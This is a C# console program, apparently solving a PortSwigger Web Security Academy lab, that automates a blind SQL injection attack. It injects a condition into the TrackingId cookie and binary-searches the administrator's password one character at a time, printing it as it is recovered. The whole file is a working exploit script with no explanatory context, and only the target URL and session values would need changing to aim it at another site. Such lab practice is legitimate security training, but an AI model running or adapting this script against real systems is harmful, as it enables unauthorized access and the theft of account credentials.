using System;
using System.Collections.Generic;
using System.ComponentModel.Design;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using xNet;
using static System.Collections.Specialized.BitVector32;

namespace BinarySeacrhTest
{
    internal class Program
    {
        public static  Dictionary<int, char> map = new Dictionary<int, char>() ;
        static bool check(int c,int vt)
        {
            try
            {
                string url = "https://0abd007d031a8c378064676800aa0064.web-security-academy.net/login";
                string pass = map[c].ToString();
                HttpRequest request = new HttpRequest();
                request.AddHeader("Cookie", " TrackingId=UHwEBbKlfKDsgkNR'and (select substr(password," + vt + ",1) from users where username='administrator')>='"+ pass + "'--; session=lc2lCS5fJL6ylZeCrNqJG7LG4FGGjk4l");
                var body = "csrf=DH0bp8zJbZ8knzou9ey4g2jg7yYJfvg1&username=administrator&password=a";
                var response =  request.Post(url,body, "application/x-www-form-urlencod").ToString();
                if (response.Contains("Welcome back")) return true;
                return false;
                return true;
            }
            catch
            {
                return false;
            }
        }
        static void Main(string[] args)
        {
            int count = 0;
            for(char i = '0'; i <= '9'; i++)  map.Add(++count,i);
            for (char i = 'A'; i <= 'Z'; i++) map.Add(++count,i);
            for (char i = 'a'; i <= 'z'; i++) map.Add(++count,i);
            int nPass = 20;
            for (int i = 1; i <= 20; i++)
            {
                //script
            }
            string pass = "";
            for (int i = 1; i <= nPass; i++)
            {
                int l = 1;
                int r = count;
                int mid = 0;
                int ans = -1;
                while (l <= r)
                {
                    mid = (l + r) / 2;
                    if (check(mid,i) == true)
                    {
                        ans = mid;
                        l = mid + 1;
                    }
                    else
                    {
                        r = mid - 1;
                    }
                }
                if(ans != -1)
                {
                    pass += map[ans];
                    Console.WriteLine(pass);
                }
                else
                {
                    break;
                }
            }

        }
    }
}
